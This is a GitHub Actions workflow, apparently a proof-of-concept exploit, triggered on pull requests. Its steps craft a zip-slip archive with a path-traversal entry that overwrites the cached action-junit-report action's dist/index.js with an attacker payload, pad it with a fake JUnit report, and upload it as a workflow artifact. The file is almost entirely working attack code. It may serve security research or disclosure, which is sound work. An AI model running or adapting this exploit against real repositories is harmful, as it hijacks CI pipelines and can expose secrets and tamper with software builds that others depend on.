name: Java PR
on:
  pull_request:
jobs:
  tests:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - name: Craft malicious artifact (zip-slip -> junit action dist/index.js)
        run: |
          python3 - <<'PY'
          import zipfile
          target = "../../../_actions/mikepenz/action-junit-report/6ef3fdcfcd5f0b5d14df3e659ef19b8c6820f93d/dist/index.js"
          payload = open('exploit/payload.mjs').read()
          with zipfile.ZipFile('evil.zip', 'w', zipfile.ZIP_DEFLATED) as z:
              z.writestr(target, payload)
              z.writestr('surefire-reports/TEST-fake.xml', '<?xml version="1.0" encoding="UTF-8"?><testsuite name="Fake" tests="1" failures="0"><testcase name="ok" classname="a.B" time="0.01"/></testsuite>')
          print(zipfile.ZipFile('evil.zip').namelist())
          PY
      - name: Upload artifact via results service with raw zip
        run: node exploit/upload.mjs
